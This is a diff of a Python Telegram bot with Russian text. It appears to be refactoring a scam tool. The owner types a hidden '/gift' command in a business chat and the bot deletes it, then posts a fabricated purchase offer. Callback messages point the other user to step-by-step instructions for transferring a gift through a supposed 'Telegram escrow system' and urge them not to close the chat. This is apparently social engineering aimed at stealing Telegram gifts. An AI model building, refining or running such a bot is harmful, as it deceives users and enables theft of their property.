@@ -255,29 +255,26 @@ def handle_settings_input(message):
 def handle_business_message(message):
     conn_id = message.business_connection_id
     sender_id = message.from_user.id
-    
     if sender_id != OWNER_ID: return
-    
-    # Если пришла команда /gift — удаляем её моментально
-    if message.text.startswith("/gift"):
-        try_delete_message(message.chat.id, message.message_id, conn_id)
-        
-        parsed = parse_gift_command(message.text)
-        if not parsed:
-            send_business_message(message.chat.id, "❌ Неверный формат команды.", conn_id)
-            return
+    if not message.text.startswith("/gift"): return
 
-        name, url, amount = parsed
-        sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())
+    parsed = parse_gift_command(message.text)
+    if not parsed:
+        send_business_message(message.chat.id, "❌ Неверный формат команды.", conn_id)
+        return
 
-        if sent is None: return
+    name, url, amount = parsed
+    try_delete_message(message.chat.id, message.message_id, conn_id)
+    sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())
 
-        with offers_lock:
-            offers[sent.message_id] = {
-                "name": name, "url": url, "amount": amount,
-                "finished": False, "conn_id": conn_id,
-                "chat_id": message.chat.id, "user_id": sender_id
-            }
+    if sent is None: return
+
+    with offers_lock:
+        offers[sent.message_id] = {
+            "name": name, "url": url, "amount": amount,
+            "finished": False, "conn_id": conn_id,
+            "chat_id": message.chat.id, "user_id": sender_id
+        }
 
 # ─────────────────────── INLINE-РЕЖИМ ───────────────────────
 
@@ -325,15 +322,7 @@ def callback_router(call):
         amount = m2.group(1) if m2 else "0"
 
         if is_inline:
-            bot.answer_callback_query(
-                call.id,
-                text=(
-                    "Вы принимаете предложение.\n\n"
-                    "Сейчас вам будет отправлена подробная инструкция по передаче подарка через эксроу-систему Telegram.\n\n"
-                    "Пожалуйста, следуйте шагам строго по порядку и не закрывайте чат до завершения сделки."
-                ),
-                show_alert=True
-            )
+            bot.answer_callback_query(call.id, text="Инструкция ниже 👇")
             try:
                 bot.send_message(
                     chat_id=call.message.chat.id,
@@ -344,15 +333,7 @@ def callback_router(call):
             except Exception as e:
                 print(f"Ошибка: {e}")
         else:
-            bot.answer_callback_query(
-                call.id,
-                text=(
-                    "Вы принимаете предложение.\n\n"
-                    "Сейчас вам будет отправлена подробная инструкция по передаче подарка через эксроу-систему Telegram.\n\n"
-                    "Пожалуйста, следуйте шагам строго по порядку и не закрывайте чат до завершения сделки."
-                ),
-                show_alert=True
-            )
+            bot.answer_callback_query(call.id, text="Инструкция ниже.", show_alert=True)
             safe_edit(
                 call.message.chat.id, call.message.message_id,
                 build_escrow_message(target_user_id, name, url, amount),
